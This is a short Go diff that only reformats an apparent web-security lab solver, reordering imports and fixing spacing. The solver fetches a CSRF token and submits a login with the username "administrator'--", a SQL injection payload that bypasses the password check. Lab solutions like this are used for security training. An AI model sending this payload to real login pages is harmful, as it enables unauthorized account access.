@@ -4,10 +4,10 @@ package main
 
 import (
 	"fmt"
+	"io"
+	"log"
 	"net/http"
 	"net/http/cookiejar"
-	"log"
-	"io"
 	"net/url"
 	"regexp"
 )
@@ -31,12 +31,12 @@ func solve() error {
 		return err
 	}
 
-	resp, err := client.PostForm(u, url.Values{"username": {"administrator'--"}, "password":{"pass1"}, "csrf":{csrfToken}})
+	resp, err := client.PostForm(u, url.Values{"username": {"administrator'--"}, "password": {"pass1"}, "csrf": {csrfToken}})
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
-	if resp.StatusCode / 100 != 2 {
+	if resp.StatusCode/100 != 2 {
 		return fmt.Errorf("Status: %v", resp.Status)
 	}
 
@@ -65,7 +65,7 @@ func parseCSRFToken(url string, client *http.Client) (string, error) {
 		return "", err
 	}
 	defer resp.Body.Close()
-	if resp.StatusCode / 100 != 2 {
+	if resp.StatusCode/100 != 2 {
 		return "", fmt.Errorf("Status: %v", resp.Status)
 	}
 
